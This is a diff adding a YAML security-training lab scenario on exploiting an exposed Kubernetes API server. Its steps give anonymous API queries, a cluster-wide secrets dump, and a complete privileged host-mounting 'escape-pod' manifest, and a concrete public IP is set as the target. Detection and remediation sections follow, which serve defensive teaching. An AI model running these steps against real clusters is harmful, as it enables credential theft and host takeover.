@@ -1,0 +1,123 @@
+# Category: Container & Orchestration Security
+name: "Kubernetes API Server Public Exposure – Privilege Escalation"
+id: "container-k8s-api-exposure-001"
+category: "container_security"
+subcategory: "kubernetes"
+difficulty: "intermediate"
+estimated_time: "70 minutes"
+
+description: |
+  Exploit a publicly exposed Kubernetes API server (often on port 6443)
+  that allows anonymous access or uses weak credentials. Attackers can
+  list secrets, deploy malicious pods, and escalate to cluster admin.
+  This is common in misconfigured managed Kubernetes services.
+
+learning_objectives:
+  - Understand Kubernetes API authentication and authorization
+  - Enumerate API endpoints and discover allowed actions
+  - Use `kubectl` with anonymous token to interact
+  - Deploy a privileged pod to break out to host
+
+tools:
+  - kubectl
+  - curl
+  - kube-hunter
+  - kube-bench
+
+prerequisites:
+  - Kubernetes API endpoint reachable (e.g., https://<k8s_ip>:6443)
+  - Anonymous access or token found (e.g., from environment)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Check API server version and authorization"
+    commands:
+      - "# Query API version (anonymous allowed)"
+      - "curl -k https://<K8S_IP>:6443/version"
+      - "# List namespaces (check permissions)"
+      - "curl -k https://<K8S_IP>:6443/api/v1/namespaces"
+      - "# If 200 OK, you have access"
+    expected_output: "API version and list of namespaces"
+    detection: "API server audit logs showing requests from unauthorized IPs"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Extract secrets from default namespace"
+    commands:
+      - "# List secrets"
+      - "kubectl --insecure-skip-tls-verify -s https://<K8S_IP>:6443 get secrets -A"
+      - "# Or create a token with cluster-admin role"
+      - "# If RBAC is permissive, create a new ServiceAccount"
+    expected_output: "Secrets containing credentials, dockerconfigjson, etc."
+    detection: "Audit logs showing `list secrets` operations"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Deploy privileged pod to escape to host"
+    commands:
+      - "# Create a pod with hostPID and hostNetwork"
+      - "kubectl apply -f - <<EOF"
+      - "apiVersion: v1"
+      - "kind: Pod"
+      - "metadata:"
+      - "  name: escape-pod"
+      - "spec:"
+      - "  hostNetwork: true"
+      - "  hostPID: true"
+      - "  containers:"
+      - "  - name: escape"
+      - "    image: ubuntu"
+      - "    command: ['sleep','3600']"
+      - "    securityContext:"
+      - "      privileged: true"
+      - "    volumeMounts:"
+      - "    - mountPath: /host"
+      - "      name: host-root"
+      - "  volumes:"
+      - "  - name: host-root"
+      - "    hostPath:"
+      - "      path: /"
+      - "EOF"
+      - "# Then exec into pod and access host files"
+    expected_output: "Access to host filesystem from inside container"
+    detection: "Pod creation with privileged context; audit logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1610"
+    description: "Deploy Container"
+  - standard: "CIS Kubernetes Benchmark"
+    control: "1.1.1"
+    description: "Ensure that the API server podspec does not have insecure flags"
+
+detection:
+  network_indicators:
+    - "Traffic to port 6443 from unexpected external IPs"
+  log_indicators:
+    - "Kubernetes audit logs with anonymous user or system:unauthenticated"
+  endpoint_indicators:
+    - "kubectl executions; suspicious pods"
+
+remediation:
+  immediate:
+    - "Restrict API server to internal network or enable authorized IP ranges"
+    - "Enable RBAC and disable anonymous access"
+  long_term:
+    - "Use managed Kubernetes with integrated IAM (e.g., GKE's Workload Identity)"
+    - "Regularly audit clusterroles and clusterrolebindings"
+
+variables:
+  k8s_ip: "35.188.1.100"
+  api_port: "6443"
+
+assessment_questions:
+  - "What flag in kube-apiserver controls anonymous access?"
+  - "How can you limit the pods that can be created with hostPath?"
+  - "What is the difference between a ServiceAccount and a User account in Kubernetes?"
+
+references:
+  - url: "https://kubernetes.io/docs/reference/access-authn-authz/authentication/"
+    title: "Kubernetes Authentication"
+  - url: "https://www.cisecurity.org/benchmark/kubernetes/"
+    title: "CIS Kubernetes Benchmark"
